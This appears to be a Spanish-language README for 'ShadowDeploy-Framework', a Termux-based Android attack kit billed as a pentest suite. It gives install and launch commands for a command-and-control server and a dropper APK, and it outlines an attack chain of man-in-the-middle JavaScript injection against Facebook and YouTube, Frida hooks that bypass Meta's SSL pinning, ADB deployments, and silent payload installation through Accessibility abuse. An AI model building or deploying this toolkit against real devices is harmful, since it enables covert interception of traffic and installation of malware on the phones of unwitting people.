# En Termux:
termux-setup-storage
mkdir ShadowDeploy-Framework && cd ShadowDeploy-Framework

# INSTALACIÓN 1-CLIC:
bash setup_framework.sh
pip install -r 3_c2_server/requirements.txt
bash 4_dropper_app/build_termux.sh
cp 4_dropper_app/dropper.apk 3_c2_server/payloads/

# EJECUTAR:
python3 3_c2_server/server.py
# http://localhost:8080 ← Dashboard lista

# ShadowDeploy-Framework - Pentest Suite Completa

## Flujo de Ataque
1. **MITM + JS Injection** → Intercepta Facebook/YouTube
2. **Frida Hooks** → Bypass SSL Pinning Meta
3. **C2 Server** → Orquesta ADB + deployments
4. **Dropper APK** → Accessibility → Silent install payload

## Deploy en termux
bash setup_framework.sh
bash 4_dropper_app/build_termux.sh
python3 3_c2_server/server.py
# Dashboard: http://localhost:8080
